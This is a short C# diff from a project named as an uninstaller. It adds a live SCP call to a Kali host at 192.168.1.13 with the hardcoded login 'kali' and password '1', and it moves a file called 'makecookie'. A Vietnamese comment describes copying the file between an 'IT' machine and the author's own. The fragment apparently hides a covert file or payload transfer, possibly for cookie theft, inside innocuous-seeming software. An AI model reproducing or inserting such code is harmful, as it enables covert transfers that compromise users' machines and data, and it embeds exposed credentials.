@@ -38,9 +38,9 @@ namespace UninstallProgram.Functions
             //Console.WriteLine($"UserDirectory: {userDirectory}");
             //Console.WriteLine($"resourceName: {resourceName}");
 
-            //ip minh - name minh - duong dan tren may IT...\id_rsa, copy khoa vao duong dan - @"D:\makecookie": ten file muon copy tu IT qua may minh
+            //ip minh - name kali - pass 1 - @"D:\makecookie": ten file muon copy tu IT qua may minh
 
-            new Scp("192.168.1.13", "kali").Copy(destinationPath, @"D:\makecookie");
+            new Scp("192.168.1.13", "kali", "1").Copy(@"D:\makecookie");
         }
 
         // Phương thức copy nội dung của tệp tin nhúng ra tệp tin
